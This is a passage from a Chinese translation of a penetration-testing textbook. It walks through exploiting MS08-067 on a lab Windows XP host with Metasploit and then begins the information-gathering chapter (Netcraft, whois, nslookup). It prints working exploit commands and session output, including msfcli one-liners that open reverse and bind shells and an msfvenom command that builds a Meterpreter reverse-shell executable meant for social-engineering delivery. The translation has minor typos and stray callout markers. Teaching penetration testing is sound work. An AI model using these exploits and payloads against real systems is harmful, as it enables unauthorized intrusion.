  \n记住，微软已经对所有受此漏洞影响的平台发布了补丁，但让环境中的所有系统都更新 Windows 补丁说起来容易做起来难。你的许多渗透测试客户可能缺少 Windows\
  \ 以及其他软件的一些关键更新。\n\n我们知道目标运行的是 Windows XP SP3 英文版，因此我们可以断定正确的目标数字是 5 或 6，但并不总是这么简单。选择\
  \ `Automatic Targeting` 让 Metasploit 对 SMB 服务进行指纹识别并根据结果选择适当的目标。\n\n要设置目标选项，输入 `set\
  \ target` `<目标数字>`。在此情况下，我们将模块目标保持为默认的 `Automatic Targeting` 并继续。\n\n### 负载 (Payloads,\
  \ 或机码 Shellcode)\n\n根据 `show options` 命令的输出，目前看起来一切都已准备就绪，但我们还没有完全完成。我们忘记告诉攻击程序在目标被利用后该做什么。Metasploit\
  \ 让事情变得简单的方法之一是为我们设置好负载。Metasploit 拥有大量的负载，从简单的 Windows 命令到可扩展的 Metasploit Meterpreter（更多详细信息请参阅第\
  \ 13 章）。只需选择一个兼容的负载，Metasploit 就会构建你的攻击字符串，包括触发漏洞的代码和利用成功后运行的负载。（我们将在第 16 章所示。\n\
  \n示例 4-7. 兼容负载\n\n\n\n\n\n```\nmsf  exploit(ms08_067_netapi) > show payloads\n\n\
  Compatible Payloads\n===================\n\n   Name                            \
  \    Disclosure Date  Rank    Description\n   ----                             \
  \   ---------------  ----    -----------\n   generic/custom                    \
  \                   normal  Custom Payload\n   generic/debug_trap              \
  \                     normal  Generic x86 Debug Trap\n   generic/shell_bind_tcp\
  \                               normal  Generic Command Shell, Bind TCP\n      \
  \                                                            Inline\n   generic/shell_reverse_tcp\
  \                            normal  Generic Command Shell, Reverse\n          \
  \                                                        Inline\n   generic/tight_loop\
  \                                   normal  Generic x86 Tight Loop\n   windows/dllinject/bind_ipv6_tcp\
  \                      normal  Reflective DLL Injection, Bind\n                \
  \                                                  TCP Stager (IPv6)\n   windows/dllinject/bind_nonx_tcp\
  \                      normal  Reflective DLL Injection, Bind\n                \
  \                                                  TCP Stager (No NX or Win7)\n\
  \   windows/dllinject/bind_tcp                           normal  Reflective DLL\
  \ Injection, Bind\n                                                            \
  \      TCP Stager\n   windows/dllinject/reverse_http                       normal\
  \  Reflective DLL Injection, Reverse\n                                         \
  \                         HTTP Stager\n--snip--\n   windows/vncinject/reverse_ipv6_http\
  \                  normal  VNC Server (Reflective Injection),\n                \
  \                                                  Reverse HTTP Stager (IPv6)\n\
  \   windows/vncinject/reverse_ipv6_tcp                   normal  VNC Server (Reflective\
  \ Injection),\n                                                                \
  \  Reverse TCP Stager (IPv6)\n--snip--\n   windows/vncinject/reverse_tcp       \
  \                 normal  VNC Server (Reflective Injection),\n                 \
  \                                                 Reverse TCP Stager\n   windows/vncinject/reverse_tcp_allports\
  \               normal  VNC Server (Reflective Injection),\n                   \
  \                                               Reverse All-Port TCP Stager\n  \
  \ windows/vncinject/reverse_tcp_dns                    normal  VNC Server (Reflective\
  \ Injection),\n                                                                \
  \  Reverse TCP Stager (DNS)\n```\n\n如果你忘记设置有效负载（payload），你可能会发现奇迹地，漏洞模块（exploit\
  \ module）会自动选择默认有效负载及相关设置并运行。尽管如此，你应该养成手动设置有效负载及其选项的习惯，因为默认设置并不总是满足你的需求。\n\n###\
  \ 测试运行\n\n让我们先保持简单，首先使用默认有效负载选项发送漏洞，看看它是如何运作的。输入 `exploit` 告诉 Metasploit 运行该模块，如示例\
  \ 4-8 所示。\n\n示例 4-8.运行漏洞\n\n```\n\nmsf  exploit(ms08_067_netapi) > exploit\n\n[*]\
  \ Started reverse handler on 192.168.20.9:4444\n[*] Automatically detecting the\
  \ target...\n[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] Selected\
  \ Target: Windows XP SP3 English (AlwaysOn NX)\n[*] Attempting to trigger the vulnerability...\n\
  [*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 1 opened\
  \ (192.168.20.9:4444 -> 192.168.20.10:1334) at\n2015-08-31 07:37:05 -0400\n\nmeterpreter\
  \ >\n```\n\n如你所示，我们最终得到了 Meterpreter 会话。Meterpreter 是 *meta-interpreter*（元解释器）的缩写，是\
  \ Metasploit 独特的有效负载。我经常将其描述为“加强版的 shell”。它可以完成命令 shell 能做的一切，甚至更多。我们将在第 13 章中深入介绍\
  \ Meterpreter，但为了获取帮助，可以在 Meterpreter 控制台中输入 `help` 来查看命令列表。\n\n### 注意\n\n关于默认选项的另一个问题是，Metasploit\
  \ 使用端口 `4444`。在现实环境中，如果存在入侵防御软件，它可能会注意到 `4444` 端口的流量并说：“嘿，Metasploit！”并将其拦截。\n\n\
  现在让我们关闭 Meterpreter 会话并学习手动选择有效负载。尽管 Meterpreter 非常用，但你可能会发现某些情况下它并不是理想选择。在 Meterpreter\
  \ 中输入 `exit`。\n\n```\nmeterpreter > exit\n[*] Shutting down Meterpreter...\n\n[*]\
  \ Meterpreter session 1 closed.  Reason: User\nmsf  exploit(ms08_067_netapi) >\n\
  ```\n\n## Shell 的类型\n\n在示例 4-7 所示的列表中，你可以看到命令 shell、Meterpreter、API 调用或单个 Windows\
  \ 命令的范围。无论如何，Shell 分两类：绑定（bind）和反向（reverse）。\n\n### 绑定 Shell\n\n绑定 shell 指令目标机器在本地端口打开监听，攻击机器随后连接。然而，随着防火墙的出现，绑定\
  \ shell 的有效性已经下降，因为任何配置正确的防火墙都会拦截像 `4444` 这样的随机端口。\n\n### 反向 Shell\n\n相反，反向 shell\
  \ 主动向攻击机器连接，而不是等待传入连接。在这种情况下，我们在攻击机器上打开本地端口并监听来自目标的连接，因为这更容易通过防火墙。\n\n### 注意\n\n\
  你可能会想：“这书是 2002 年写的吗？我的防火墙有出站过滤。”现代防火墙既可以阻止入站连接，也可以阻止出站连接。你可以轻易阻止环境中的主机连接外部，例如连接端口\
  \ `4444`。但假设我将监听器设置在端口 `80` 或 `443`，对于防火墙来说这看起来是网络流量，而你知道必须允许用户访问 Facebook，否则会引起混乱。\n\
  \n## 手动设置有效负载\n\n让我们为有效负载选择一个 Windows 反向 shell。设置有效负载的方法与设置 `RHOST` 相同：`set payload\
  \ <要使用的 payload>`。\n\n```\nmsf  exploit(ms08_067_netapi) > set payload windows/shell_reverse_tcp\n\
  payload => windows/shell_reverse_tcp\n```\n\n\n\n\n\n```\nmsf  exploit(ms08_067_netapi)\
  \ > show options\n\nModule options (exploit/windows/smb/ms08_067_netapi):\n\n  \
  \ Name     Current Setting  Required  Description\n   ----     --------------- \
  \ --------  -----------\n   RHOST    192.168.20.10    yes       The target address\n\
  \   RPORT    445              yes       Set the SMB service port\n   SMBPIPE  BROWSER\
  \          yes       The pipe name to use (BROWSER, SRVSVC)\n\nPayload options (windows/shell_reverse_tcp):\n\
  \n   Name      Current Setting  Required  Description\n   ----      ---------------\
  \  --------  -----------\n   EXITFUNC  thread           yes       Exit technique:\
  \ seh, thread, process, none\n  ❶LHOST                      yes       The listen\
  \ address\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\
  \n   Id  Name\n   --  ----\n   0   Automatic Targeting\n```\n\n`LHOST` ❶ 是我们 Kali\
  \ 机器上的本地主机，即我们希望目标机器回连的 IP 地址。要找到 IP 地址（如果你忘记了），请直接在 `Msfconsole` 中输入 Linux 的 `ifconfig`\
  \ 命令。\n\n```\nmsf  exploit(ms08_067_netapi) > ifconfig\n[*] exec: ifconfig\n\neth0\
  \      Link encap:Ethernet  HWaddr 00:0c:29:0e:8f:11\n          inet addr:192.168.20.9\
  \  Bcast:192.168.20.255  Mask:255.255.255.0\n\n--snip--\n```\n\n现在使用 `set LHOST\
  \ 192.168.20.9` 设置 `LHOST` 选项。`LPORT`（用于回连的本地端口）以及 `EXITFUNC`（告诉 Metasploit 如何退出）保持默认值即可。现在输入示例\
  \ 4-10 所示的 `exploit` 来再次发送我们的利用，并等待 shell 出现。\n\n示例 4-10. 运行利用\n\n```\nmsf  exploit(ms08_067_netapi)\
  \ > exploit\n\n[*] Started reverse handler on 192.168.20.9:4444 ❶\n[*] Automatically\
  \ detecting the target...\n[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n\
  [*] Selected Target: Windows XP SP3 English (AlwaysOn NX) ❷\n[*] Attempting to trigger\
  \ the vulnerability...\n[*] Command shell session 2 opened (192.168.20.9:4444 ->\
  \ 192.168.20.10:1374)\n    at 2015-08-31 10:29:36 -0400\n\nMicrosoft Windows XP\
  \ [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\WINDOWS\\system32>\n\
  ```\n\n恭喜：你成功利用了你的第一台机器！\n\n以下是发生的情况：当我们输入 `exploit` 时，Metasploit 在端口 4444 上开启一个监听器以捕获来自目标的反向\
  \ shell ❶。由于我们将目标保持为 `Automatic Targeting`（自动目标），Metasploit 打印了远程 SMB 服务器并为我们选择了合适的利用程序\
  \ ❷。一旦选定利用程序，Metasploit 就会发送利用字符串并尝试控制该机器。由于利用成功，我们的处理器捕获了一个命令 shell。要关闭此 shell，输入\
  \ `ctrl-C` 并在提示符处输入 `y`。\n\n```\nC:\\WINDOWS\\system32>^C\nAbort session 2? [y/N]\n\
  \n[*] Command session 2 closed. Reason: User exit\nmsf  exploit(ms08_067_netapi)\
  \ >\n```\n\n要返回 Meterpreter shell，你可以选择一个名称带有 Meterpreter 字样的 payload，例如 `windows/meterpreter/reverse_tcp`，并再次利用\
  \ Windows XP 目标。\n\n## Msfcli\n\n现在来看另一种与 Metasploit 交互的方法：命令行界面 `msfcli`。在脚本中使用\
  \ Metasploit 以及测试模块时，`msfcli` 特别有用，因为它让你能够通过简单的单行命令运行模块。\n\n### 获取帮助\n\n要运行 `msfcli`，首先通过输入\
  \ `exit` 退出 `Msfconsole`，或者直接打开另一个控制。`msfcli` 在我们的路径中，因此我们可以在任何地方调用它。让我们先通过 `msfcli\
  \ -h` 查看 `msfcli` 的帮助菜单（示例 4-11）。\n\n```\nroot@kali:~# msfcli -h\nUsage: /opt/metasploit/apps/msf3/msfcli\
  \ <exploit_name> <option=value> [mode]\n  ==============================================================\n\
  \n      Mode           Description\n      ----           -----------\n      (A)dvanced\
  \     显示此模块的可用选项\n      (AC)tions      显示辅助模块的可用动作\n      (C)heck        运行所选模块的检查程序\n\
  \      (E)xecute      执行所选模块\n      (H)elp         你在看它呢，宝贝！\n      (I)DSvasion\
  \  显示此模块的可用回避选项\n      (O)ptions      显示此模块的可用选项\n      (P)ayloads     显示此模块的可用\
  \ payload\n      (S)ummary      显示关于此模块的信息\n      (T)argets      显示利用模块的可用目标\n```\n\
  \n与 Msfconsole 不同，使用 `msfcli`，我们只需要一条命令就能告诉 Metasploit 运行利用所需的所有信息❶。幸运的是，`msfcli`\
  \ 有一些模式可以帮助我们构建最终命令。例如，`O` 模式显示所选模块的选项，`P` 模式显示兼容的 payload ❸。\n\n### 显示选项\n\n让我们再次针对\
  \ Windows XP 目标使用 MS08-067 利用程序。根据帮助页面，我们需要向 `msfcli` 传递要使用的利用程序名称并设置所有选项 ❶。使用 `O`\
  \ 模式显示可用选项。输入 `msfcli windows/smb/ms08_067_netapi O` 查看选项，如示例 4-12 所示。\n\n```\n\
  root@kali:~# msfcli windows/smb/ms08_067_netapi O\n[*] Please wait while we load\
  \ the module...\n\n   Name     Current Setting  Required  Description\n   ---- \
  \    ---------------  --------  -----------\n   RHOST                    yes   \
  \    The target address\n   RPORT    445              yes       Set the SMB service\
  \ port\n   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\
  ```\n\n我们看到了与 Msfconsole 相同的选项。提示我们将 `RHOST` 设置为目标机器的 IP 地址，但正如我们在帮助页面看到的，在 `msfcli`\
  \ 中设置与 Msfconsole 有所不同。在这里我们使用 `option=value`。例如，要设置 `RHOST`，我们输入 `RHOST=192.168.20.10`。\n\
  \n### Payload\n\n要查看与此模块兼容的 payload，使用 `P` 模式。尝试 `msfcli windows/smb/ms08_067_netapi\
  \ RHOST=192.168.20.10 P`，如示例 4-13 所示。\n\n```\nroot@kali:~# msfcli windows/smb/ms08_067_netapi\
  \ RHOST=192.168.20.10 P\n[*] Please wait while we load the module tree...\n\nCompatible\
  \ payloads\n===================\n\n   Name                                     \
  \        Description\n   ----                                             -----------\n\
  \   generic/custom                                   使用自定义字符串或文件作为 payload。设置\n\
  \                                                      PAYLOADFILE 或 PAYLOADSTR。\n\
  \   generic/debug_trap                               在目标进程中生成调试中断\n   generic/shell_bind_tcp\
  \                           监听连接并启动命令\n                                        \
  \              shell\n   generic/shell_reverse_tcp                        回连攻击者并启动命令\n\
  \                                                      shell\n   generic/tight_loop\
  \                               在目标进程中生成循环\n--snip--\n```\n\n这次我们将使用 bind shell\
  \ payload。记住，bind shell 仅在目标机器的本地端口上监听。在 payload 运行后，由我们的攻击机器来连接目标机器。回顾我们在 Msfconsole\
  \ 中的工作，选择 payload 需要额外的 payload 特有选项，我们可以再次使用 `O` 标志查看它们。\n\n\n\n\n\n由于我们的绑定型 shell（bind\
  \ shell）不会回连我们的攻击机器，因此我们不需要设置 `LHOST` 选项，目前可以将 `LPORT` 选项保持为默认的 4444。看起来我们已经有了再次利用\
  \ Windows XP 目标所需的一切。最后，为了告诉 `msfcli` 运行利用，我们使用 `E` 标记（示例 4-14）。\n\n示例 4-14. 在 Msfcli\
  \ 中运行利用程序\n\n```\nroot@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10\
  \ PAYLOAD=windows/shell_bind_tcp E\n[*] Please wait while we load the module tree...\n\
  \nRHOST => 192.168.20.10\nPAYLOAD => windows/shell_bind_tcp\n[*] Started bind handler\
  \ ❶\n[*] Automatically detecting the target...\n[*] Fingerprint: Windows XP - Service\
  \ Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\n\
  [*] Attempting to trigger the vulnerability...\n[*] Command shell session 1 opened\
  \ (192.168.20.9:35156 -> 192.168.20.10:4444)\n    at 2015-08-31 16:43:54 -0400\n\
  \nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\
  \nC:\\WINDOWS\\system32>\n```\n\n看起来一切运行正常，我们又得到了一个 shell。但这一次，Metasploit 不再是在指定的本地端口\
  \ 4444 上启动一个反向处理程序（reverse handler），而是为绑定型 shell ❶ 启动了一个处理程序。在 Metasploit 发送利用字符串后，绑定处理程序会自动连接到\
  \ payload 指定的端口并连接到 shell。我们再次控制了目标机器。\n\n## 使用 Msfvenom 创建独立有效载荷\n\n2011 年，Msfvenom\
  \ 被引入 Metasploit。在 Msfvenom 出现之前，可以使用 `msfpayload` 和 `msfencode` 工具联合创建各种输出格式的独立编码\
  \ Metasploit 有效载荷，例如 Windows 可执行文件和 ASP 页面。随着 Msfvenom 的引入，`msfpayload` 和 `msfencode`\
  \ 的功能合并到了单一工具中，尽管 Metasploit 仍然包含了 `msfpayload` 和 `msfencode`。要查看 Msfvenom 的帮助页面，输入\
  \ `msfvenom -h`。\n\n到目前为止，使用 Metasploit 的目标一直是利用目标系统上的漏洞并控制机器。现在我们将尝试一些不同的方法。我们不再依赖于缺失的补丁或其他安全问题，而是希望利用一个可能永远无法完全修补的安全问题：用户。Msfvenom\
  \ 允许你构建独立有效载荷运行在目标系统上，以尝试利用用户，无论是通过社会工程攻击（第 11 章）还是通过将有效载荷上传到我们获得写入权限的漏洞服务器（我们将在\
  \ 第 8 章 中所示）。当其他手段都失败时，用户通常可以成为切入点。\n\n### 选择有效载荷\n\n要列出所有可用有效载荷，输入 `msfvenom -l\
  \ payloads`。我们将使用 Metasploit 的 Meterpreter 有效载荷之一 `windows/meterpreter/reverse_tcp`，它提供了一个带有\
  \ Meterpreter shell 的反向连接。使用 `-p` 选择有效载荷。\n\n### 设置选项\n\n要查看模块应使用的正确选项，在选择有效载荷后输入\
  \ `-o` 标记，如 示例 4-15 所示。\n\n示例 4-15. Msfvenom 中的选项\n\n```\nroot@kali:~# msfvenom\
  \ -p windows/meterpreter/reverse_tcp -o\n[*] Options for payload/windows/meterpreter/reverse_tcp\n\
  \n    Name      Current Setting  Required  Description\n    ----      ---------------\
  \  --------  -----------\n    EXITFUNC  process          yes       Exit technique:\
  \ seh, thread, process,\n                                           none\n    LHOST\
  \                      yes       The listen address\n    LPORT     4444        \
  \     yes       The listen port\n```\n\n如所预期，我们需要设置 `LHOST`，而 `LPORT` 设置为默认的 4444。为了练习，通过输入\
  \ `LPORT=12345` 将 `LPORT` 设置为 12345。我们还看到了 `EXITFUNC`，我们可以保持其默认值。因为这是一个反向连接有效载荷，我们需要设置\
  \ `LHOST` 选项来告诉目标机器连接回哪里（我们的 Kali 机器）。\n\n### 选择输出格式\n\n现在告诉 Msfvenom 使用哪种输出格式。我们是从\
  \ Windows 可执行文件运行此有效载荷，还是想创建一个可以上传到我们已获得权限的 Web 服务器的 ASP 文件？要查看所有输出格式，输入 `msfvenom\
  \ -h`。\n\n```\nroot@kali:~# msfvenom -h\nOutput formats\n    asp, aspx, bash, c,\
  \ csharp, dll, elf, exe, exe-only, exe-service, exe-small,\n    js, java, macho,\
  \ msi, num, perl, phf, pl, python, py, raw, rb, ruby, sh,\n    vba, vbs, vxd, war\n\
  ```\n\n要选择输出格式，使用 `-f` 选项配合选定的格式：\n\n```\nroot@kali:~# msfvenom -p windows/meterpreter/reverse_tcp\
  \ -LHOST=192.168.20.9 -LPORT=12345 -f exe > chapter4example.exe\n```\n\n但如果你运行此命令，你会看到控制台输出了一些垃圾。如果我们对新创建的可执行文件运行\
  \ `file` 命令，发现它是一个 Windows 可执行文件 `chapter4example.exe`。\n\n```\nroot@kali:~# msfvenom\
  \ -p windows/meterpreter/reverse_tcp -LHOST=192.168.20.9 -LPORT=12345 -f exe > chapter4example.exe\n\
  root@kali:~# file chapter4example.exe\nchapter4example.exe: PE32 executable (MS\
  \ for Windows), x86 build, console data, stripped\n```\n\n\n\n\n第一步是告诉 `multi/handler`\
  \ 我们需要 Metasploit 众许多处理器中的哪一个。我们需要捕获在用 Msfvenom 创建可执行文件时使用的 `windows/meterpreter/reverse_tcp`\
  \ 载荷。使用 `set PAYLOAD windows/meterpreter/reverse_tcp` 选择它，并紧接着运行 `show options`（示例\
  \ 4-16 ）。\n\n示例 4-16. multi/handler 的选项\n\n```\nmsf > use multi/handler\nmsf  exploit(handler)\
  \ > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\n\
  msf  exploit(handler) > show options\n\nModule options (exploit/multi/handler):\n\
  \n   Name  Current Setting  Required  Description\n   ----  ---------------  --------\
  \  -----------\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name\
  \      Current Setting  Required  Description\n   ----      ---------------  --------\
  \  -----------\n   EXITFUNC  process          yes       Exit technique: seh, thread,\
  \ process,\n                                          none\n   LHOST           \
  \           yes       The listen address\n   LPORT     4444             yes    \
  \   The listen port\n\n--snip--\nmsf  exploit(handler) >\n```\n\n从这里开始，我们告诉 Metasploit\
  \ 我们在创建载荷时使用了什么设置。我们将 `LHOST` 选项设置为我们的本地 Kali IP 地址，并将 `LPORT` 设置为在 Msfvenom 中选择的端口，在本例中分别为\
  \ 192.168.20.9 和 12345。一旦所有载荷选项都设置正确，输入 `exploit`，如 示例 4-17 所示。\n\n示例 4-17. 设置处理器\n\
  \n```\nmsf  exploit(handler) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf\
  \  exploit(handler) > set LPORT 12345\nLPORT => 12345\nmsf  exploit(handler) > exploit\n\
  \n[*] Started reverse handler on 192.168.20.9:12345\n[*] Starting the payload handler...\n\
  ```\n\n如你所见，Metasploit 按照指令在端口 12345 上设置了一个反向处理器，等待载荷的回调。\n\n现在我们可以切换回 Windows XP\
  \ 目标机器并运行下载的可执行文件。在你的 Windows 目标机器上运行 `chapter4example.exe`。回到 Msfconsole，你应该能看到处理器接收了反向连接，你获得了一个\
  \ Meterpreter 会话。\n\n```\n[*] Sending stage (752128 bytes) to 192.168.20.10\n[*]\
  \ Meterpreter session 1 opened (192.168.20.9:12345 -> 192.168.20.10:49437) at 2015-09-01\
  \ 11:20:00 -0400\n\nmeterpreter >\n```\n\n如果你喜欢，可以花些时间尝试 Msfvenom。当我们尝试在第 12 章 中绕过杀毒解决方案时，我们会回到这个工具工具。\n\
  \n## 使用辅助模块\n\nMetasploit 最初设计为一个利用框架，并且它仍然是利用世界的顶尖竞争者。但在随后的几年里，它的功能增长方向与投入其中的创意性大脑一样多样化。我有时开玩笑说，Metasploit\
  \ 除了帮我洗衣服什么都能做，而我目前正在为这个功能编写一个模块。\n\n抛开脏袜子不谈，除了利用之外，Metasploit 还有模块可以协助渗透测试的每个阶段。某些不用于利用的模块被称为\
  \ `auxiliary modules`（辅助模块）；它们包含了漏洞扫描器、模糊测试器，甚至是拒绝服务模块。（一个容易记住的经验是：利用模块使用载荷，而辅助模块不使用。）\n\
  \n例如，当我们在本章较早第一次使用 `windows/smb/ms08_067_netapi` 利用模块时，它的选项之一是 `SMBPIPE`。该选项的默认值是\
  \ `BROWSER`。让我们来看一个将枚举 SMB 服务器上监听管道的辅助模块，`auxiliary/scanner/smb/pipe_auditor`（示例\
  \ 4-18）。（我们像使用利用模块一样使用辅助模块，并且像利用模块一样，我们可以运行它们。） \n\n示例 4-18. scanner/smb/pipe_auditor\
  \ 的选项\n\n```\nmsf > use scanner/smb/pipe_auditor\nmsf  auxiliary(pipe_auditor) >\
  \ show options\n\nModule options (auxiliary/scanner/smb/pipe_auditor):\n\n   Name\
  \       Current Setting  Required  Description\n   ----       ---------------  --------\
  \  -----------\n  RHOSTS                      yes       The target address or CIDR\
  \ identifier\n   SMBDomain  WORKGROUP        no        The domain to use for authentication\n\
  \   SMBPass                     no        The password for the specified username\n\
  \   SMBUser                     no        The username to authenticate as\n   THREADS\
  \                    1         The number of concurrent threads\n```\n\n\n\n另一方面，你可能发现自己正在为那些补丁管理得非常完善的客户工作，从\
  \ Windows 操作系统到所有第三方软件，整个组织都遵循定期的补丁周期。某些客户可能会部署尖端的安全控制措施，例如仅允许 Internet Explorer\
  \ 访问网络的代理服务器。这将阻止即使通过 80 或 443 端口回连并看起来像 流量的 Metasploit 反向 shell（reverse shells），除非你能够利用\
  \ Internet Explorer 程序，而该程序可能已经被完全修补了。你还可能在边界发现入侵防御防火墙，它们会丢弃任何看起来稍微像攻击流量的字符串。\n\n\
  仅仅向这些高安全性网络投掷 `MS08-067` Metasploit 模块将让你一无所获，顶多可能会接到网络监控厂商打来的电话，对方手里拿着了逮捕你的逮捕令。（别担心：作为渗透测试的一部分，你将有一张“免死金牌”。）但即使是高度安全的网络，其强度也取决于其最薄弱的一环。例如，我曾为一家公司进行过现场渗透测试，该公司采用了我刚才提到的所有安全控制措施。然而，所有\
  \ Windows 工作站的本地管理员密码都是同一个五个字母的字典单词。在破解密码后，我能够以管理员身份登录网络上的每台工作站。从那里，我能够使用名为 `token\
  \ impersonation`（令牌劫持）的技术来获取域管理员权限。尽管有所有这些强大的安全控制措施，只需花一点精力，我就能像攻破一个缺失 2003 年补丁的网络一样，接管整个网络。\n\
  \n在学习本书的剩余内容中，你将不仅学到破解漏洞系统所需的所需的技能，还将学会在没有显而易见的突破口时寻找路径的思维方式。\n\n现在，让我们注意力转移到收集目标信息上，以便我们制定稳妥的攻击计划。\n\
  \n# 第二部分：评估\n\n## 第 5 章：信息收集\n\n在本章中，我们将开始渗透测试的信息收集阶段。该阶段的目标是尽可能多地了解我们的客户。CEO 是否在\
  \ Twitter 上暴露了太多信息？系统管理员是否在归档邮件列表（listservs）中发帖询问如何加固 `Drupal` 安装？他们的 Web 服务器运行什么软件？面向互联网的系统监听的端口是否超过了正常范围？或者，如果是内部渗透测试，域控制器的\
  \ IP 地址是多少？\n\n我们还将开始与目标系统进行交互，在不主动攻击它们的情况下尽可能多地了解它们。我们将利用在此阶段获得的知识进入威胁建模阶段，在那个阶段，我们会像攻击者一样思考，并根据收集的信息制定攻击计划。根据我们发现的信息，我们将使用漏洞扫描技术主动搜索并验证漏洞，这些技术将在下一章中介绍。\n\
  \n### 开源情报收集\n\n在向客户发送任何数据包之前，我们就可以从客户的组织和基础设施中了解到很多信息，但信息收集可能是一个变动的目标。研究每位员工的在线生活是不可行的，而且鉴于收集了大量信息，很难从噪声中区分出重要数据。如果\
  \ CEO 经常发关于她喜欢的运动球队的推文，那么该球队的名称可能是她网页邮箱密码的依据，但也可能完全无关。在其他情况下，捕捉到关键信息会更容易。例如，如果你的客户在网上发布了精通某些软件的系统管理员招聘，那么这些平台很可能已经部署在客户的基础设施中了。\n\
  \n与从翻垃圾桶（dumpster diving）、倾倒网站数据库和社交工程学等隐蔽来源获得的情报相反，`开源情报`（或 `OSINT`）是从公共记录和社交媒体等合法来源收集的。渗透测试的成功往往取决于信息收集阶段的结果，因此在本节中，我们将查看一些从这些公共来源获取有趣信息的工具。\n\
  \n### Netcraft\n\n有时，Web 服务器和网络托管公司收集并公开的信息可以让你对一个网站了如许多。例如，名为 Netcraft 的公司会记录运行时间并对底层软件进行查询。（这些信息在\
  \ `[`www.netcraft.com/`](http://www.netcraft.com)` 公开）。Netcraft 还提供其他服务，其反钓鱼产品对信息安全领域特别感兴趣。\n\
  \n例如，图 5-1 显示了我们查询 `[`www.netcraft.com/`](http://www.netcraft.com)` `[`www.bulbsecurity.com`](http://www.bulbsecurity.com)`\
  \ 的结果。如你所示，`bulbsecurity.com` 首次出现在 2012 年 3 月。它通过 GoDaddy 注册，IP 地址为 `50.63.212.1`，并运行着\
  \ Linux 和 Apache Web 服务器。\n\n有了这些信息，在渗透测试 `bulbsecurity.com` 时，我们可以从排除仅影响 Microsoft\
  \ IIS 服务器的漏洞开始。或者，如果我们想尝试社交工程来获取网站的凭据，我们可以写一封看起来来自 GoDaddy 的邮件，要求管理员登录并检查某些安全设置。\n\
  \n![Netcraft 对 bulbsecurity.com 的结果](img/httpsatomoreillycomsourcenostarchimages2030306.png.jpg)图\
  \ 5-1. Netcraft 对 bulbsecurity.com 的结果\n\n### Whois 查询\n\n所有域名注册商都保留其托管域名的记录。这些记录包含了有关所有者的信息，包括联系方式。例如，如果我们在\
  \ Kali 机器上运行 `whois` 命令行工具来查询有关 `bulbsecurity.com` 的信息，如示例 5-1 所示，我们看到我使用了隐私注册，所以我们学不到什么。\n\
  \n示例 5-1. bulbsecurity.com 的 Whois 信息\n\n```\nroot@kali:~# whois bulbsecurity.com\n\
  \  Registered through: GoDaddy.com, LLC (http://www.godaddy.com)\n   Domain Name:\
  \ BULBSECURITY.COM\n      Created on: 21-Dec-11\n      Expires on: 21-Dec-12\n \
  \     Last Updated on: 21-Dec-11\n\n   Registrant: ❶\n   Domains By Proxy, LLC\n\
  \   DomainsByProxy.com\n   14747 N Northsight Blvd Suite 111, PMB 309\n   Scottsdale,\
  \ Arizona 85260\n   United States\n\n   Technical Contact: ❷\n      Private, Registration\
  \  BULBSECURITY.COM@domainsbyproxy.com\n      Domains By Proxy, LLC\n      DomainsByProxy.com\n\
  \      14747 N Northsight Blvd Suite 111, PMB 309\n      Scottsdale, Arizona 85260\n\
  \      United States\n      (480) 624-2599      Fax -- (480) 624-2598\n\n   Domain\
  \ servers in listed order:\n      NS65.DOMAINCONTROL.COM ❸\n      NS66.DOMAINCONTROL.COM\n\
  ```\n\n该网站使用了隐私注册，因此注册者 ❶ 和技术联系人 ❷ 都是代理公司。代理注册提供隐私注册，隐藏了你拥有域名的 Whois 信息中的个人详情。然而，我们确实看到了\
  \ `bulbsecurity.com` 的域名服务器 ❸。\n\n### DNS 侦察\n\n我们还可以利用域名系统（DNS）服务器获取更多关于域名的信息。DNS\
  \ 服务器将人类可读的 URL `[www.bulbsecurity.com](http://www.bulbsecurity.com)` 转换为 IP 地址。\n\
  \n#### Nslookup\n\n\n\n\n例如，我们可以使用像 `Nslookup` 这样的命令行工具，如示例 5-2 所示。\n\n#### 示例 5-2.\
  \ www.bulbsecurity.com 的 nslookup 信息\n\n```\nroot@Kali:~# nslookup www.bulbsecurity.com\n\
  Server:    75.75.75.75\nAddress:   75.75.75.75#53\n\nNon-authoritative answer:\n\
  www.bulbsecurity.com    canonical name = bulbsecurity.com.\nName:    bulbsecurity.com\n\
  Address: 50.63.212.1 ❶\n```\n\n如你在 ❶ 所示，`Nslookup` 返回了 `[www.bulbsecurity.com](http://www.bulbsecurity.com)`\
  \ 的 IP 地址。\n\n我们还可以通过查找 `MX` 记录（DNS 术语中的邮件）来让 `Nslookup` 查找同一网站的邮件服务器，如示例 5-3 所示。\n\
  \n#### 示例 5-3. bulbsecurity.com 邮件服务器的 nslookup 信息\n\n```\nroot@kali:~# nslookup\n\
  > set type=mx\n> bulbsecurity.com\nServer:    75.75.75.75\nAddress:   75.75.75.75#53\n\
  \nNon-authoritative answer:\nbulbsecurity.com    mail exchanger = 40 ASPMX.GOOGLEMAIL.com.\n\
  bulbsecurity.com    mail exchanger = 20 ALT1.ASPMX.L.GOOGLE.com.\nbulbsecurity.com\
  \    mail exchanger = 50 ASPMX3.GOOGLEMAIL.com.\nbulbsecurity.com    mail exchanger\
  \ = 30 ALT2.ASPMX.L.GOOGLE.com.\nbulbsecurity.com    mail exchanger = 10 ASPMX.L.GOOGLE.com.\n\
  ```\n\n`Nslookup` 显示 `bulbsecurity.com` 正在使用 Google Mail 作为其邮件服务器，这是正确的，因为我使用了 Google\
  \ Apps。\n\n#### Host（主机）\n\n另一个用于 DNS 查询的工具是 `Host`。我们可以通过命令 `host -t ns domain`\
  \ 询问 `Host` 某个域名的名称服务器。域名查询的一个很好的例子是 `zoneedit.com`，这是一个用于演示区域传输漏洞的域名，如下：\n\n```\n\
  root@kali:~# host -t ns zoneedit.com\nzoneedit.com name server ns4.zoneedit.com.\n\
